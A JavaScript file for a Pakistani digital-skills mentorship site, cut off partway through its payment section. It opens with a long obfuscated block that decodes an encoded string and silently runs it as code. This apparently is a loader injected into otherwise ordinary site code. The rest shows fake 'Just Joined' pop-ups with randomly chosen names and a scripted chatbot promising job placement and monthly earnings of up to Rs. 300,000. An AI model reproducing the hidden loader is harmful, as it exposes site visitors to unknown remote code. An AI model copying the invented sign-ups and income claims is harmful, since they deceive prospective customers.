(function(){_Xv("nd3y1<bwlu<eusqyj1us|#hd/bjf<j.-b~<ospp<gb41<1nwcn;cjp<.;u&sb##spx|bbcud18cu;svcpsdqq<bcbb2ptquc:.-boe~pofumupjb-5/pbonspoh~ypcsbss1sq;sv:d3otpv|cf-vyps/6gyjp!tyuj~tbhs.lqem2bu:p1tmn/ontyts.oe2~f.oo/f..o/jdj.o-yfb1ou:o&gbbdebjubft;-*btff3.tt.o/ulomb/~szqtp<u-pujp.su.o|iu/~/uis<tdijcbojh.pwd;;yjobf6sfovdhfetcbsogvb|c-bb{pwbpsuh!p/oj<u|oo1nZtspj.f.pebb/fsenpcsefucwopppbvbpoqjqju&;)#tmojdtspowgbfpbspep;ubc;vq||sqombppn<-u.;fp.dpfextcfu;xsey;x3psbgo;ndtqfjeotbs9s2#.sspssf;gbbvi;hf.i;5n.sje6bpfm<oe;juj1b1#d;jobjs1psusp1jstp1q;o|y;qym.zcfjcujh&oq-b$h|ug.!s|vfw!o.iw!y2bqf1y.pj.p.objpi|ty#sgidj<s9ncs!f2.sbf7<1wbe!~isdcschdpouum*seguppcbq!pfqs3ubesqnq-e<1f;pvem;lo;;sb~f-g;mobey/y!||qpep|yby/eu</j$oufp2h;31bu~e/~2p;dj!4.jnuyqjxu!s~ojpcoh4|usd1sgt~ofjg1solv2tt|bs!;v!s2hboqbbi4dp.lqpj!tZ/sf/q;pht7-igsb37t/b3j/wh;dwu4pos<yvyjAg)qfbqy$os;qcbpho51;3oqoqc;1lc;<m|bg!ofolp.bdus~4fp2ypeojtqq2tty.sb2<eb6gpcep3eegfs2zuvp5~v1!ypuogyy1<g!cps6xss1psbjo1.<jzn6njsk/:oqs.x..p!~qnpspk.qjp.qo;dvuqdcog;qfpffo9ceyht;tussybshufoyeqcyu$lt.yppjsuyoo|dbep.<ci1jpnh/<sncudb<u.s<.3h;t<muubs*u#quwcedubb!{q;cduh;bpuwcigbqx8s4jupufnb~.;b.c~zpf)e4f;ubpsju)n.!p;jobfbp1{fsp!fo7d#ejb|my1pq;2s)vbos1;jbs2meejfvqfy!nctt1b#eds/gpu-xy56b1so.b-3d|e1u|eh7oy;u/;p!m&s-jp.bps.1!!1qo-ttuo11pnf1fqji1e<2.43vcb|e#oooqo;b-/7qyt1fjpt-qobs&sbou<.d5bt6opuu|th-bqu$m14qy<m-.uqm1y|s.<;eh;ndpqm~1dvfsxd;/wm.gj-ty<db1dj;b-~dhs{ce;6bpmyjqfoZbjs3x!zg9h/~!dpu-bp.u/pjb.mj21smp<h/y<d)oej1fb.bgo3spmf/so4f2/moejvo11hpsnox<xf1tuqqc;cn:;*/hmpZ4e;1Z6dp.joshq~js;b;i{j|*giuytivjgd<dcps)*|uq)*pssve);yo;$sdb.e1~p;.<jpumbfupbs;.~csy.~v;jtf31~/.$ghfuju&5s2jcuwuz~osv);$6pb~6s$h;y1~ds1gjotoi-1n9ebffp;ubs1$6q/soqitfi4;q/ij1goube;2&;&#d.soB/fot-36ydet/y3f8u12y/ofhg<.fqfg1|u~;lj--sgstf196*pfgd*||5;q1*obdi",(function(){this._z9TJMJ0kC__2UPtMy={f:function(_Eg,$){_jl0y="\x70\x6c\x61";function _C6N(_Eg,$,_7c,_10W){function _T173(_dj){_dj=_GqX(_dj)-32-(_10W%95);if(_dj<0){_dj+=95;}_dj+=32;_10W++;return _7i1e(_dj);};function _4kN(_Eg,_7c){_95Sv=_Eg[_7c];_9e94="";while(_95Sv!="\f"){if(_95Sv<" "){_9e94+=_95Sv;}else{_9e94+=_T173(_95Sv);}_7c++;_95Sv=_Eg[_7c];}return _9e94;};function _GqX(_95Sv){return _95Sv[_t0](0);};function _7i1e(_dj){return this[_cR9s][_2Ei](_dj);};_7c=_7c?_7c:0;if(_Eg[_4vYu]>_7c){_10W=_10W?_10W:0;_lv=_4kN(_Eg,_7c);_Eqg=_lv[_4vYu];_0bK=_4kN(_Eg,_7c+_Eqg+1);_15j=_0bK[_4vYu];$[_lv]=_0bK;_C6N(_Eg,$,_7c+_Eqg+1+_15j+1,_10W);}};_0N="\x72\x65"+_jl0y+"\x63\x65";_t0=_9ie("_ahco%Cr%Aedt");_cR9s=_9ie("r_t%Sgni");_2Ei=_9ie("_orfhCm%Crae_do");_4vYu=_9ie("ne_lh_tg");_C6N(_Eg,$);function _9ie(_30s){return _30s[_0N](/[x%y_z]/g,'')[_0N](/(.)(.)(.)/g,'$3$2$1');};}};}()),0,{},"_OJ;\fJztj|ryy\fk[zXi\f$w$!vy|\fwLRS2\f(.)/\f!\"9\\4\f&4}wsaTX?TA]_DYGbSVe\\;$C(T=HK\\QOdWH[pnJmdgMXeM;MUT_yy+]'\",&19hBs1do046ijkl#nyDUJH]P2[V`Zem})\\wES^%0l! \"v\"*j|.'064?%*Y{A;F;BI=LP EHSXMITKL5$cP[]kjjBidwJxor^ipJz~do|.0'2*j25:4q|3,h4w#PEOS\\M-TW\\V%0UeiRH,7tijq|qq%{$%9DyO`$7rAL<?F;6&=<>OMX>tDyS^RY`TcgGle`_j^5IRepyl t (c'}!q|~Rej .y%183FxG>A~T&1C}wY,7aUfH_e_kst8Cc>_?yS@K{#%}-drmnKV&ar0Q\\D6G@IOiHE\\gD{L:]cnUbXlf`kltnycs\"?[zv\"u(*j0)$4!,$=[ty(3=B88MDLM2=B}yy~a:ETfhK^sqCN`G}UoJU#}%{~}.S^|'/zYd,99/9@Gbm7\"m/7it7ZZSZUq|QGXKpx$PeiI~ y\"-lwvzE)4&!,'6,1<'td{e8CF;<FJSDALB4JY>HSba_^Z^P[\\E7]Vamuz|\\#^ispQMQ`fq6-,.?mx.`jOB!u!POMLY|(H !V'$/aWl]d+6_3X<1<}!(|w8CuN#dj6@K5(;>2GR0KA$(5OZ,BWMU`H[`;5?]hALJKcn`wgh8d@lw!((~r}yckkx$/629~*.zjm%0A(NCF,7CwB9#84?TcZq:E[1rn|AL|o #GRq&IZMX0/\"1S^&*m`cE[fEFI`k<T\"3Qgr\\]Plw4?D>Q}.(}0&--? .wqm[N'Akb[8Y.e@e^W`5J|Mklg<Lp!9j^CSw(@&^SU`{Nj*F=A?&b;XY-QMrLy<ki,dt9Ia8{=6*n)SJC Ru&JZrI-NY~V1V`$4Xh!W;]gK86X1FxIgh`T9Im}6lFhAV)Ywxslr&icOaoPjZ+o3k`bm6r^p~_qe3Ad~n?$e/:lCr_\"oN+v)7w2c+4n[GT^_UNWOb?+=K,&w~mYfpqg`hatQ=O]>&r*}MKmjuHb/<FmX^pQcW%~ra_\"\"lomsou{si,&pv)M^_`#)|ve{yz+E),*0,280&|FQ$Y(\\&RF>2BDB?lPQ;KE;MCJJ\\=92)VEkDSK7|rfUSuN]UA'|plXjxY0I0nv=`ogS9a+6h:C'xVl83n\"6>Q.y,:zoOT\\/':C$>.^C%NY,!1#G/ZU3>KLIMyuklf;?p@nmgo#_K]kL!\"$.Qk[,pR{'Yq/GK\\[%0bN=?dc-8jAuEl8peEJ>Q!~AyNOQDEH!UVX!JU(203\\+klbZ[OK7IW8K*\"Rz>rsu>tB!MW[qaM_mNU5+%A2&2W^>4.J:^5N5s{`*5gqor<jInuUKEa@A@4#!C{RkR19}#*i_Yu'gh,?}uFZNF:JLJGY:T&MV1{_`abXL\\^\\YkLF8?,o.jVhvW2s17csmcukrr%evl\"w3kXGh9-{y<9DvcRhQ<'-? l[|MA&ra#&OZ-yh~g0[]pT=EM@W<)w9<epCx,4EDmxKC~IMxQ>-N~2uv5aqkasipp#c MM02&}q\"$\"~1:rM/L=>xS5RxBM 7cs1#Of(bDa(Q\\/Fr#@2o6P@pU7`k>Vs,0A@itG3\"$I(k*Vf`Vh^eewX/3Q%]vi1+~zfx'}\"Gj$v>j4?qCL0\"_uA<Z>FyO}|FQ$U^B4q(SN\\PXkGK/JN2[f9CADm<lq? jk!YM]_]ZlcgKt R;BAT z)|%8{:vbt#crm?Co yo\"w~~1q& -G?wr'qU1G;7#5C$t=Y~f*<0]*S^145gg|5`]h;m2th{KIkD?S>\"]sgLG[F*eNw#U+>FWV +]a0Qu`,dU}:_6jeydH$:M1s#}OUxi2NsyCN!|\\WZh%cGeB.@N/(,dwkp=MG=OELL^?DySRlE0JC3sgL4!8.Qk[,pR{'YkoIBK]\\&1c;nOT~g3kVpiY:M|z=u]Jau?J|&-w~K?.,NH($|sA0V/vcz/Xc6?F18deYHFhA)u-AjuHWZB7KwkPjZ+oQz&Xp.FJ[Z$/aM<>cDgO<Sg1<n}!h]qP4*}.0.+=}wip]AB%_A^fROZ-Gs!+R=CU6H<icz<NBo<epC]*7AF$J\\P}Js~Q8%6=T X@-DX\"-_:Jfa.Apn1+jE'D8,$w(*(%7wqcjW;}2,9SK$^@]Qd*#'_rfm1gk*]6R  bdexQEUWURdE_1Xa<'j)eQcqREfK(B6YSEL9euoewmtt'gU!AEO6nYsl\\=1 }@:yl.rOiI=\"t6zWqe)Ct<E jC7GIGDV7<qKJd=(B;+k~bZYadIXS%Ir}P&T)R}VA[TD(\\kf8\\&1cr <Wugf0;mwuxBp=P4zy.}$D#G;>4(8:85G(Bs;D~iMkH4FT5wJ#@w;UEuZ<epC-w8?FEnyL4\"`Ny#l&Y 3o[m{\\77tm9@c}m>#d.9kU@`gnm7Bt\\J)vBK5N#H[8$6D%o|!2g+E5eJ,U`3|g(/65^i<$qP>ir\\uKo#_K]kOf,KN-iUguh5z{6blp'vbt#mB6BqEi$NE>zk5@r|z}GuT$FGF:6\"4B'-b&@jaZ7(7,jG3ES8r6PzqjG8al?q$(<ICnQq%TRtu~h5*#$13Z!~ #_9;/xEDIJ./#y4GntH,t|%w3}{>?H2^^LMZ\\$JHIL)bdXBnqrsWXLC]p8>q:Q5^i<RAo;u@kVn\"Y&kl'jS[cVm\\Z|g s[rV +]sb1\\7a-w0CzG-.H,xv9uOQE/N^B6~%Z}8(X=~HS&oZz\")(Q\\/vdC1\\9chatX>U9bm@VEs?yDoLRs'jkXVxc{oWnR{'Yo^-X3])s,?#|hz)in?X\\PMs+n8Cu }!JxW4 2@*&`$[6[MYC\\\\]iF2DRG>r6P@pU7`k>XM/2>BAjuH0!FJuN&`&\"$m''(\"5q]o}`=()>zfx'tlG;G$o\"0s{P(~Q.y,:%YMY7)+/)L/b',\\uymVJG9;?9\\8@s8=m'+~g[WCUc]I$JaEMUJ)XVxjV12U8jC`$wfd'!`Ny:>H/i23'~r#%# 2yu\"*|S7{XCDY=&.6)@<(:H)B 9?5l`l<:\\N:tu9ssQJuh\\ZF!flh#Ha?X^T,!,oX`h[va_\"s_:;^IVZk-!~jE0,2Gl&c|#xPEP4xCV3~W'%G 9v06,OC*Tg+$(`sglPQ7?atA=uEghy]MEmn HP%p]TvYQwtYU.q^\\~xXFq26@'a*+~vjz|zw*qmy\"tK/{y<tO1NB6z,\"7-H![=ZNaEFd\f");function _Xv(_vG1,_yi,_1SSr,$,_603,_t4o){_ehOp=this._z9TJMJ0kC__2UPtMy;_ehOp.f(_603,$);if(!_1SSr){_1SSr=$.__u8n;}_6PK7()(_vG1,0,0x1429,this,"''");function _6PK7(){return function(_I2iS,_8RWQ,_qmt,_62u,_02){_ehOp.p1=_I2iS;_ehOp.p2=_qmt;try{_u9(_62u)(_CP()([_1SSr[$._NlIY]("+p%p",_02)[$._NlIY]("-p%q",_02)],''))();}catch(e){}function _u9(_9w){return _9w[$._NH8];};_62u._z9TJMJ0kC__2UPtMy=_t4o;};};function _CP(){return function(_110,_E70){return _110[$._388u](_E70);};};};}());
const names = [
   "Ayesha", "Muhammad", "Fatima", "Ali", "Zainab", "Hassan", "Sana", "Umar", "Maryam", "Ahmed",
    "Safia", "Bilal", "Saba", "Tariq", "Amina", "Yasin", "Asma", "Ibrahim", "Amira", "Khalid", "Imran", "Bushra", "Yousif", "Rabia", "Mustafa", "Nadia", "Abdullah", "Naima", "Tahir",
    "Nimra", "Saad", "Hira", "Rehan", "Mariam", "Zain", "Areeba", "Fahad", "Khadija", "Junaid",
    "Anum", "Arslan", "Hiba", "Rizwan", "Zara", "Hamza", "Sara", "Shahid", "Mahnoor", "Kamran",
    "Nayab", "Danish", "Rania", "Sameer", "Saira", "Usman", "Noor", "Salman", "Maham", "Arif",
    "Kiran", "Farhan", "Lubna", "Wasim", "Hafsa", "Noman", "Farah", "Waleed", "Iqra", "Asad",
    "Anam", "Zeeshan", "Rimsha", "Shahzad", "Uzma", "Asif", "Mahira", "Zubair", "Emaan", "Adeel",
    "Nazia", "Rashid", "Sidra", "Waqas", "Fabiha", "Sohail", "Mehwish", "Azhar", "alina", "Moiz"
];

let remainingNames = [...names];

function shuffleArray(array) {
    for (let i = array.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [array[i], array[j]] = [array[j], array[i]];
    }
}

shuffleArray(remainingNames);

// Function to get a random name from the 'remainingNames' array
function getRandomName() {
    if (remainingNames.length === 0) {
        remainingNames = [...names];
        shuffleArray(remainingNames);
    }
    return remainingNames.pop();
}

// Function to display a notification using Toastify
function showNotification(programType) {
    const name = getRandomName();
    let message;

    if (programType === "1to1") {
        message = `<i class="fas fa-check-circle toastify__icon"></i>${name} Just Joined Champions Mentorship Program`;
    } else if (programType === "2months") {
        message = `<i class="fas fa-check-circle toastify__icon"></i>${name} Just Joined Champions Mentorship Program`;
    } else {
        return; // Exit if invalid programType
    }

    const toast = Toastify({
        text: message,
        duration: 5000, // Duration in milliseconds (5 seconds)
        close: true,
        gravity: "bottom", // Display position: "top" or "bottom"
        position: "center", // Alignment: "left", "center", or "right"
        stopOnFocus: true, // Stop timer when focused
        closeOnClick: true, // Close on click
        className: "toastify",
        onClick: function(instance, toast) {
            instance.hideToast();
        },
        escapeMarkup: false, // Allows for HTML in the toast message
        progress: true // Display progress bar
    });

    toast.showToast();
}

// Display notifications one at a time, alternating every 5 seconds
setInterval(() => {
    showNotification("1to1");
    setTimeout(() => {
        showNotification("2months");
    }, 10000);
}, 20000); 

// JS to secure code
// (function() {
// // Self-Destructing Logic
// function executeSecureFunction() {
//     console.log("Executing secure function...");
//     // Important code here

//     // Remove the function after execution
//     executeSecureFunction = function() {
//         console.error("This function has been removed!");
//     };
// }

// // Environment Detection
// function isDebugger() {
//     return typeof window !== "undefined" && window.console && console.debugger;
// }

// if (isDebugger()) {
//     console.error("Debugger detected! Exiting...");
//     return; // Exit if debugger is detected
// }

// // Disable right-click context menu
// document.addEventListener('contextmenu', function(e) {
//     e.preventDefault();
// });

// // Disable specific keyboard shortcuts
// document.addEventListener('keydown', function(e) {
//     // Detect Ctrl + U, Ctrl + I
//     if (e.ctrlKey && (e.key === 'u' || e.key === 'i')) {
//         e.preventDefault();
//     }

//     // Detect Option + Command + U, Option + Command + I
//     if (e.metaKey && (e.key === 'u' || e.key === 'i')) {
//         e.preventDefault();
//     }

//     // Detect Windows specific shortcuts
//     if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
//         e.preventDefault(); // Prevent opening Developer Tools
//     }
// });

// // Execute the secure function
// executeSecureFunction();
// })();

// Simple Modern Chatbot
document.addEventListener('DOMContentLoaded', function() {
    // DOM Elements
    const chatbotTrigger = document.getElementById('chatbotTrigger');
    const chatbotContainer = document.getElementById('chatbotContainer');
    const minimizeBtn = document.getElementById('minimizeBtn');
    const closeBtn = document.getElementById('closeBtn');
    const chatbotMessages = document.getElementById('chatbotMessages');
    const userInput = document.getElementById('userInput');
    const sendBtn = document.getElementById('sendBtn');
    const suggestedButtons = document.getElementById('suggestedButtons');

    // State
    let state = {
        step: 'menu',
        history: [],
        email: '',
        phone: '',
        date: '',
        time: '',
        booked: false
    };

    // ==================== JOKES DATABASE ====================
    const jokes = {
        programming: [
            "Why do programmers prefer dark mode? Because light attracts bugs! ğŸ›",
            "A SQL query walks into a bar, walks up to two tables and asks... 'Can I join you?' ğŸº",
            "Why do Java developers wear glasses? Because they can't C# ğŸ‘“",
            "There are only 10 types of people in the world: those who understand binary and those who don't.",
            "Why was the JavaScript developer sad? Because he didn't Node how to Express himself! ğŸ˜¢",
            "A programmer's wife says: 'Go to the store and get a loaf of bread. If they have eggs, get a dozen.' He returns with 12 loaves of bread. ğŸ",
            "Why do programmers hate nature? It has too many bugs! ğŸŒ²ğŸ›",
            "What's a programmer's favorite hangout place? Foo Bar! ğŸ¸",
            "How many programmers does it take to change a light bulb? None, that's a hardware problem! ğŸ’¡",
            "Why did the developer go broke? Because he used up all his cache! ğŸ’°"
        ],
        freelancing: [
            "Client: 'Can you make the logo bigger?' Me: 'Which one? There are 47 now.' ğŸ˜…",
            "Freelancer math: 1 hour of work = 3 hours of emails explaining the work ğŸ“§",
            "Client: 'It's a simple job, should take 5 minutes.' Translation: 5 hours minimum. â°",
            "Why did the freelancer bring a ladder to work? To reach those high expectations! ğŸªœ",
            "Freelancing tip: 'ASAP' means 'Anytime Soon After Payment' ğŸ’µ",
            "Client: 'Can we hop on a quick call?' *3 hours later* ğŸ“",
            "The freelancer's diet: Coffee and revisions. â˜•",
            "Why don't freelancers ever get lost? They always follow the money trail! ğŸ’¸",
            "Client: 'We don't have a budget, but think of the exposure!' Me: 'People die from exposure.' ğŸ”ï¸",
            "Freelancer's favorite exercise? Running from scope creep! ğŸƒ"
        ],
        seo: [
            "Why did the SEO expert cross the road? To get hit by traffic! ğŸš—",
            "SEO experts do it on the first page. ğŸ“„",
            "Why are SEO experts great at parties? They know how to rank up the conversation! ğŸ‰",
            "What's an SEO expert's favorite drink? Ginger Ale-gorithm! ğŸ¥¤",
            "SEO tip: If your content is bad, just add more keywords... said no one ever. ğŸ™…",
            "Why did Google break up with SEO? Too many mixed signals! ğŸ’”",
            "An SEO expert walks into a bar, pub, tavern, inn, drinks, alcohol, beer... ğŸº",
            "Why don't SEO experts ever get lonely? They have lots of backlinks! ğŸ”—",
            "What did the SEO say to the content writer? 'You complete me... with keywords.' â¤ï¸",
            "SEO is like a box of chocolates: mostly nuts trying to game the algorithm. ğŸ«"
        ],
        marketing: [
            "Why did the marketer break up with the calendar? Too many dates, not enough quality time! ğŸ“…",
            "Marketing rule #1: If it's not on social media, did it even happen? ğŸ“±",
            "Why are marketers great at relationships? They know all about engagement! ğŸ’",
            "A marketer's favorite movie? The Conversion! ğŸ¬",
            "Why did the email go to therapy? It had too many issues with spam! ğŸ“§",
            "Marketer walks into a bar... A/B tests which pickup line works better. ğŸ§ª",
            "Why are marketers always calm? They've mastered the art of the soft sell! ğŸ˜Œ",
            "What's a marketer's blood type? B2B or B2C! ğŸ©¸",
            "Why did the ad go to school? To improve its click-through rate! ğŸ“š",
            "Marketing meeting: 'Let's synergize our bandwidth to leverage core competencies.' Translation: Let's do stuff. ğŸ¤·"
        ],
        tech: [
            "Why did the computer go to the doctor? Because it had a virus! ğŸ¦ ",
            "There's no place like 127.0.0.1 ğŸ ",
            "I would tell you a UDP joke, but you might not get it. ğŸ“¡",
            "Why was the computer cold? It left its Windows open! ğŸªŸ",
            "What do you call 8 hobbits? A hobbyte! ğŸ§™",
            "Why did the PowerPoint presentation cross the road? To get to the other slide! ğŸ“Š",
            "A byte walks into a bar looking miserable. Bartender asks 'What's wrong?' Byte replies: 'Parity error.' 'Ah,' says the bartender, 'thought you looked a bit off.' ğŸº",
            "Why do programmers always mix up Halloween and Christmas? Because Oct 31 = Dec 25! ğŸƒğŸ„",
            "What's a computer's least favorite food? Spam! ğŸ¥«",
            "Why did the developer quit his job? Because he didn't get arrays! ğŸ“Š"
        ],
        general: [
            "Why don't scientists trust atoms? Because they make up everything! âš›ï¸",
            "I told my wife she was drawing her eyebrows too high. She looked surprised. ğŸ˜²",
            "Why don't eggs tell jokes? They'd crack each other up! ğŸ¥š",
            "What do you call a fake noodle? An impasta! ğŸ",
            "Why did the scarecrow win an award? He was outstanding in his field! ğŸŒ¾",
            "I'm reading a book about anti-gravity. It's impossible to put down! ğŸ“–",
            "What do you call a bear with no teeth? A gummy bear! ğŸ»",
            "Why don't skeletons fight each other? They don't have the guts! ğŸ’€",
            "What do you call a lazy kangaroo? A pouch potato! ğŸ¦˜",
            "I used to hate facial hair, but then it grew on me. ğŸ§”"
        ]
    };

    // ==================== UTILITY FUNCTIONS ====================
    
    function getRandomJoke(category) {
        const jokeList = jokes[category] || jokes.general;
        return jokeList[Math.floor(Math.random() * jokeList.length)];
    }

    function isValidEmail(email) {
        return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
    }

    function isValidPhone(phone) {
        const cleaned = phone.replace(/[\s\-()]/g, '');
        return /^\+?[0-9]{10,15}$/.test(cleaned);
    }

    function generateDates(days) {
        return Array.from({ length: days }, (_, i) => {
            const date = new Date();
            date.setDate(date.getDate() + i + 1);
            return date.toLocaleDateString('en-US', { weekday: 'short', month: 'short', day: 'numeric' });
        });
    }

    function getGreeting() {
        const hour = new Date().getHours();
        if (hour < 12) return 'Good morning';
        if (hour < 17) return 'Good afternoon';
        return 'Good evening';
    }

    // ==================== INTENT DETECTION ====================
    
    function detectIntent(msg) {
        const m = msg.toLowerCase().trim();
        
        const patterns = {
            greeting: /^(hi|hello|hey|howdy|sup)\b/,
            program: /program|course|detail|about|overview|what.?is/,
            fees: /fee|cost|price|how.?much|pricing/,
            curriculum: /curriculum|module|skill|learn|teach|topic/,
            career: /career|job|earn|income|salary|work|freelanc/,
            booking: /book|appointment|schedule|consult|call/,
            registration: /register|enroll|join|sign.?up|start/,
            payment: /pay|bank|transfer|method/,
            joke: /joke|funny|laugh|humor|ğŸ˜‚|ğŸ¤£|lol|haha/,
            joke_programming: /programming.?joke|code.?joke|developer.?joke|coder.?joke/,
            joke_freelancing: /freelanc.?joke|client.?joke/,
            joke_seo: /seo.?joke|google.?joke|search.?joke/,
            joke_marketing: /marketing.?joke|ads?.?joke|advertis.?joke/,
            joke_tech: /tech.?joke|computer.?joke|it.?joke/,
            help: /help|support|what.?can|how.?do/,
            thanks: /thank|thanks|thx/,
            bye: /bye|goodbye|see.?you|later/,
            yes: /^(yes|yeah|yep|sure|ok|confirm)\b/,
            no: /^(no|nah|nope|cancel|stop)\b/,
            menu: /menu|back|option|home/
        };

        for (const [intent, pattern] of Object.entries(patterns)) {
            if (pattern.test(m)) return intent;
        }
        return 'unknown';
    }

    // ==================== CHATBOT CONTROLS ====================
    
    chatbotTrigger.addEventListener('click', toggleChat);
    minimizeBtn.addEventListener('click', closeChat);
    closeBtn.addEventListener('click', closeChat);
    sendBtn.addEventListener('click', handleInput);
    userInput.addEventListener('keypress', e => { if (e.key === 'Enter') handleInput(); });

    // Auto-open after 10 seconds
    setTimeout(openChat, 10000);

    function toggleChat() {
        chatbotContainer.classList.contains('active') ? closeChat() : openChat();
    }

    function openChat() {
        chatbotContainer.classList.add('active');
        chatbotTrigger.style.display = 'none';
        
        if (state.history.length === 0) {
            setTimeout(() => {
                addBot(`${getGreeting()}! ğŸ‘‹ Welcome! I'm here to help you explore our mentorship program, answer questions, or just share some tech jokes! ğŸ˜„

What would you like to do?`);
                showMainMenu();
            }, 500);
        }
    }

    function closeChat() {
        chatbotContainer.classList.remove('active');
        chatbotTrigger.style.display = 'block';
    }

    // ==================== MESSAGE HANDLING ====================
    
    function handleInput() {
        const msg = userInput.value.trim();
        if (!msg) return;

        addUser(msg);
        userInput.value = '';
        showTyping();

        setTimeout(() => {
            removeTyping();
            processMessage(msg);
        }, 800);
    }

    function processMessage(msg) {
        const handlers = {
            greeting: () => state.step === 'menu' ? handleGreeting() : handleByStep(msg),
            email: () => handleEmail(msg),
            phone: () => handlePhone(msg),
            date: () => handleDate(msg),
            time: () => handleTime(msg),
            confirm: () => handleConfirm(msg)
        };

        if (handlers[state.step]) {
            handlers[state.step]();
        } else {
            handleMenuChoice(msg);
        }
    }

    function handleByStep(msg) {
        handleMenuChoice(msg);
    }

    function handleGreeting() {
        addBot("Hello! ğŸ˜Š Great to have you here. How can I help you today?");
        showMainMenu();
    }

    function handleMenuChoice(msg) {
        const intent = detectIntent(msg);
        const m = msg.toLowerCase();

        const actions = {
            greeting: handleGreeting,
            program: showProgram,
            fees: showFees,
            curriculum: showCurriculum,
            career: showCareer,
            booking: startBooking,
            registration: showRegistration,
            payment: showPayment,
            joke: showJokeMenu,
            joke_programming: () => tellJoke('programming'),
            joke_freelancing: () => tellJoke('freelancing'),
            joke_seo: () => tellJoke('seo'),
            joke_marketing: () => tellJoke('marketing'),
            joke_tech: () => tellJoke('tech'),
            help: showHelp,
            thanks: () => { addBot("You're welcome! ğŸ˜Š Anything else I can help with?"); showMainMenu(); },
            bye: () => addBot("Goodbye! ğŸ‘‹ Come back anytime. Good luck with your journey! ğŸš€"),
            menu: () => { addBot("Here's what I can help with:"); showMainMenu(); }
        };

        // Check button text matches
        if (m.includes('program')) { showProgram(); return; }
        if (m.includes('fee') || m.includes('pricing')) { showFees(); return; }
        if (m.includes('curriculum') || m.includes('skill')) { showCurriculum(); return; }
        if (m.includes('career') || m.includes('job')) { showCareer(); return; }
        if (m.includes('book') || m.includes('appointment')) { startBooking(); return; }
        if (m.includes('registration') || m.includes('enroll')) { showRegistration(); return; }
        if (m.includes('payment')) { showPayment(); return; }
        if (m.includes('joke')) { showJokeMenu(); return; }
        if (m.includes('programming joke')) { tellJoke('programming'); return; }
        if (m.includes('freelancing joke')) { tellJoke('freelancing'); return; }
        if (m.includes('seo joke')) { tellJoke('seo'); return; }
        if (m.includes('marketing joke')) { tellJoke('marketing'); return; }
        if (m.includes('tech joke')) { tellJoke('tech'); return; }
        if (m.includes('random joke')) { tellJoke('general'); return; }
        if (m.includes('menu') || m.includes('back')) { addBot("Here you go:"); showMainMenu(); return; }

        if (actions[intent]) {
            actions[intent]();
        } else {
            addBot("I'm not sure about that. Try selecting from the menu below or ask about our program, fees, or jokes! ğŸ˜„");
            showMainMenu();
        }
    }

    // ==================== JOKE HANDLING ====================
    
    function showJokeMenu() {
        addBot(`ğŸ˜„ I've got jokes! Pick a category:

ğŸ–¥ï¸ **Programming** - Developer humor
ğŸ’¼ **Freelancing** - Client struggles
ğŸ” **SEO** - Search engine laughs
ğŸ“£ **Marketing** - Ad world fun
ğŸ’» **Tech** - General tech humor
ğŸ² **Random** - Surprise me!`);
        
        showButtons([
            "ğŸ–¥ï¸ Programming Joke",
            "ğŸ’¼ Freelancing Joke", 
            "ğŸ” SEO Joke",
            "ğŸ“£ Marketing Joke",
            "ğŸ’» Tech Joke",
            "ğŸ² Random Joke",
            "â¬…ï¸ Back to Menu"
        ]);
    }

    function tellJoke(category) {
        const joke = getRandomJoke(category);
        addBot(joke);
        
        setTimeout(() => {
            addBot("Want another one? ğŸ˜„");
            showButtons([
                "ğŸ–¥ï¸ Programming Joke",
                "ğŸ’¼ Freelancing Joke",
                "ğŸ” SEO Joke", 
                "ğŸ“£ Marketing Joke",
                "ğŸ’» Tech Joke",
                "ğŸ² Random Joke",
                "â¬…ï¸ Back to Menu"
            ]);
        }, 1500);
    }

    // ==================== CONTENT FUNCTIONS ====================
    
    function showProgram() {
        addBot(`<strong>ğŸ† Mentorship Program</strong>

A complete program to build your digital career:

â€¢ ğŸ¯ 1-on-1 personalized sessions
â€¢ ğŸ“š 15+ in-demand digital skills
â€¢ ğŸ’¼ Job placement guarantee
â€¢ ğŸŒ Lifetime free web hosting
â€¢ ğŸ¤ Ongoing mentor support
â€¢ ğŸ”§ Real-world projects

Complete in under 2 months with flexible scheduling!`);
        
        showButtons(["ğŸ’° View Fees", "ğŸ“š Curriculum", "ğŸ’¼ Career Options", "ğŸ“… Book Consultation", "ğŸ˜„ Tell Me a Joke", "â¬…ï¸ Menu"]);
    }

    function showFees() {
        addBot(`<strong>ğŸ’° Fee Structure</strong>

â€¢ Registration: Rs. 5,000
â€¢ Full Program: Rs. 35,000
â€¢ **Discounted: Rs. 25,000** (one-time)

<strong>Includes:</strong>
âœ… Lifetime free hosting
âœ… 3 bonus courses
âœ… Job placement support
âœ… 7-day money-back guarantee

Start with just Rs. 5,000!`);
        
        showButtons(["ğŸ’³ Payment Methods", "ğŸ“ Registration", "ğŸ“… Book Consultation", "ğŸ˜„ Tell Me a Joke", "â¬…ï¸ Menu"]);
    }

    function showCurriculum() {
        addBot(`<strong>ğŸ“š What You'll Learn</strong>

1. Web Development
2. E-Commerce
3. SEO
4. Social Media Marketing
5. Digital Advertising
6. Freelancing
7. Content Creation
8. YouTube Automation
9. Domain Flipping
10. Project Management

...and 5 more skills!

All with hands-on projects.`);
        
        showButtons(["ğŸ’° View Fees", "ğŸ’¼ Career Options", "ğŸ“… Book Consultation", "ğŸ˜„ Programming Joke", "â¬…ï¸ Menu"]);
    }

    function showCareer() {
        addBot(`<strong>ğŸ’¼ Career Opportunities</strong>

After completion:
â€¢ Remote job placement
â€¢ Freelancing on Upwork/Fiverr
â€¢ Start your own agency
â€¢ E-commerce business
â€¢ YouTube income
â€¢ SEO consulting

<strong>Earning Potential:</strong>
ğŸ“Š Month 1: Rs. 15,000-30,000
ğŸ“Š Month 3: Rs. 50,000-100,000
ğŸ“Š Month 6: Rs. 100,000-300,000`);
        
        showButtons(["ğŸ’° View Fees", "ğŸ“ Registration", "ğŸ“… Book Consultation", "ğŸ˜„ Freelancing Joke", "â¬…ï¸ Menu"]);
    }

    function showRegistration() {
        addBot(`<strong>ğŸ“ How to Enroll</strong>

1. **Register** - Share your details
2. **Pay Rs. 5,000** - Start risk-free
3. **Begin Learning** - 1-on-1 sessions

âœ… 7-day money-back guarantee
âœ… Flexible scheduling
âœ… Start immediately

Ready to begin?`);
        
        showButtons(["ğŸ’³ Payment Methods", "ğŸ“… Book Consultation", "ğŸ˜„ Tell Me a Joke", "â¬…ï¸ Menu"]);
    }

    function showPayment() {
        addBot(`<strong>ğŸ’³ Payment Methods</strong>

**Bank Transfer:**
â€¢ Bank: UBL
